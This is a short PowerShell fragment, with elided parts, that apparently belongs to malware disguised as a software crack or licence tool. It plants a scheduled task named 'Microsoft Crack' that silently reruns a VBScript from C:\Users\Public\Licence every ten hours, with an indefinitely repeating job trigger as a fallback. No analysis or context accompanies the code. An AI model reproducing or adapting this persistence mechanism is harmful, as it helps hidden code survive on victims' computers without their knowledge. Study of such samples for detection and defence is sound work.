...
if(!(Test-Path "$location\Microsoft\count.txt")) {
    ...
    $count= Get-Content "$location\Microsoft\count.txt"
     ...
     try { 
	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "Microsoft Crack" /TR 'wscript.exe ""C:\Users\Public\Licence\Licence-main\Autorun.vbs""' /ST 00:00 /RI 600 /DU 24:00 | Out-Null
     }
     catch { 
	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("600")) -RepeatIndefinitely
